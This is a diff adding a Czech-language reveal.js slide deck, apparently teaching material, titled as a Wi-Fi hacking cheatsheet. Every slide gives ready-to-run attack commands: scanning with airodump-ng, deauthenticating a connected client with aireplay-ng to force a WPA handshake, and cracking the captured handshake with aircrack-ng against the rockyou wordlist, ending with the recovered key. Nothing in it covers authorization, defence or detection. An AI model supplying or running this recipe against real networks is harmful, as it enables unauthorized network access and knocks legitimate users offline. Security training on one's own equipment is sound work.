@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="cs">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Hacking Cheatsheet - Příkazy krok za krokem</title>
+    <link rel="stylesheet" href="dist/reset.css">
+    <link rel="stylesheet" href="dist/reveal.css">
+    <link rel="stylesheet" href="dist/theme/white.css" id="theme">
+    <link rel="stylesheet" href="dist/plugin/highlight/monokai.css">
+    <link rel="stylesheet" href="css/presentation.css">
+    <style>
+      .cmd-table {
+        width: 100%;
+        font-size: 0.58em;
+        border-collapse: collapse;
+        text-align: left;
+        margin-top: 1rem;
+      }
+      .cmd-table th {
+        background-color: #007acc;
+        color: white;
+        padding: 0.6rem;
+      }
+      .cmd-table td {
+        padding: 0.6rem;
+        border-bottom: 1px solid #ddd;
+        vertical-align: top;
+      }
+      .cmd-code {
+        font-family: monospace;
+        background-color: #1e1e1e;
+        color: #dcdcdc;
+        padding: 0.4rem 0.6rem;
+        border-radius: 4px;
+        white-space: pre-wrap;
+        word-break: break-all;
+        font-size: 1.1em;
+      }
+      .step-badge {
+        background: #f6821f;
+        color: white;
+        font-weight: bold;
+        padding: 0.2rem 0.5rem;
+        border-radius: 4px;
+        white-space: nowrap;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="reveal">
+      <div class="slides">
+
+        <!-- Slide 1: Kompletní přehled na jednom slajdu -->
+        <section>
+          <h2>Wi-Fi Hacking: Všechny příkazy krok za krokem</h2>
+          <p style="font-size: 0.75em; color: #666; margin-bottom: 0.5rem;">Kartu máte již v <strong>Monitor módu</strong> (<code>wlan0mon</code>)</p>
+          
+          <table class="cmd-table">
+            <thead>
+              <tr>
+                <th style="width: 12%;">Krok</th>
+                <th style="width: 48%;">Příkaz (Command)</th>
+                <th style="width: 40%;">Popis &amp; Cíl</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><span class="step-badge">Krok 1</span></td>
+                <td><div class="cmd-code">iwconfig</div></td>
+                <td>Ověření rozhraní v Monitor módu (<code>wlan0mon</code>).</td>
+              </tr>
+              <tr>
+                <td><span class="step-badge">Krok 2</span></td>
+                <td><div class="cmd-code">sudo airodump-ng wlan0mon</div></td>
+                <td>Skenování všech sítí v okolí. Poznamenej si <strong>BSSID</strong> a <strong>CH</strong> sítě.</td>
+              </tr>
+              <tr>
+                <td><span class="step-badge">Krok 3</span></td>
+                <td><div class="cmd-code">sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; -w pokus wlan0mon</div></td>
+                <td>Zacílení na síť a ukládání paketů do <code>pokus-01.cap</code>. Nech běžet! Poznamenej si MAC klienta.</td>
+              </tr>
+              <tr>
+                <td><span class="step-badge">Krok 4</span></td>
+                <td><div class="cmd-code">sudo aireplay-ng --deauth 5 -a &lt;BSSID&gt; -c &lt;MAC_KLIENTA&gt; wlan0mon</div></td>
+                <td><em>(V novém okně)</em> Odeslání deautentizace pro opakováné přihlášení klienta.</td>
+              </tr>
+              <tr>
+                <td><span class="step-badge">Krok 5</span></td>
+                <td><div class="cmd-code"># Kontrola v 1. okně: [ WPA handshake: BSSID ]</div></td>
+                <td>Ověř zachycení handshaku vpravo nahoře a stiskni <code>Ctrl + C</code> pro ukončení skenu.</td>
+              </tr>
+              <tr>
+                <td><span class="step-badge">Krok 6</span></td>
+                <td><div class="cmd-code">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</div></td>
+                <td>Slovníkový útok a odhalení hesla (<code>KEY FOUND!</code>).</td>
+              </tr>
+            </tbody>
+          </table>
+        </section>
+
+        <!-- Slide 2: Krok 1 & 2 -->
+        <section>
+          <h2>Krok 1 &amp; 2: Kontrola a Skenování</h2>
+          <div style="text-align: left; font-size: 0.85em;">
+            <p><strong>1. Ověření rozhraní v Monitor módu:</strong></p>
+            <pre><code class="language-bash code-block">iwconfig</code></pre>
+            
+            <p style="margin-top: 1.5rem;"><strong>2. Skenování všech sítí v dosahu:</strong></p>
+            <pre><code class="language-bash code-block">sudo airodump-ng wlan0mon</code></pre>
+            <p style="font-size: 0.8em; color: #555;">&rarr; V tabulce si poznamenej <strong>BSSID</strong> (MAC routeru) a <strong>CH</strong> (číslo kanálu) vaší sítě.</p>
+          </div>
+        </section>
+
+        <!-- Slide 3: Krok 3 & 4 -->
+        <section>
+          <h2>Krok 3 &amp; 4: Zacílení a Deautentizace</h2>
+          <div style="text-align: left; font-size: 0.85em;">
+            <p><strong>3. Zacílení a ukládání paketů do souboru (Okno 1):</strong></p>
+            <pre><code class="language-bash code-block">sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w pokus wlan0mon</code></pre>
+            <p style="font-size: 0.8em; color: #555;">&rarr; Toto okno nechte běhat! Poznamenej si MAC klienta z dolní části (STATION).</p>
+
+            <p style="margin-top: 1.5rem;"><strong>4. Vynucení odpojení a přihlášení klienta (Okno 2):</strong></p>
+            <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon</code></pre>
+          </div>
+        </section>
+
+        <!-- Slide 4: Krok 5 & 6 -->
+        <section>
+          <h2>Krok 5 &amp; 6: Ověření a Prolomení Hesla</h2>
+          <div style="text-align: left; font-size: 0.85em;">
+            <p><strong>5. Ověření v Okna 1 (vpravo nahoře):</strong></p>
+            <pre><code class="language-bash code-block">[ WPA handshake: AA:BB:CC:11:22:33 ]</code></pre>
+            <p style="font-size: 0.8em; color: #555;">&rarr; Jakmile uvidíš hlášku WPA handshake, stiskni <code>Ctrl + C</code>.</p>
+
+            <p style="margin-top: 1.5rem;"><strong>6. Slovníkový útok (Aircrack-ng):</strong></p>
+            <pre><code class="language-bash code-block">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</code></pre>
+            <p style="font-size: 0.85em; color: #28a745; font-weight: bold; margin-top: 0.5rem;">&rarr; KEY FOUND! [ heslo ]</p>
+          </div>
+        </section>
+
+      </div>
+    </div>
+    <script src="dist/reveal.js"></script>
+    <script src="dist/plugin/highlight.js"></script>
+    <script>
+      Reveal.initialize({ hash: true, transition: 'slide', slideNumber: 'c/t', plugins: [RevealHighlight] });
+    </script>
+  </body>
+</html>
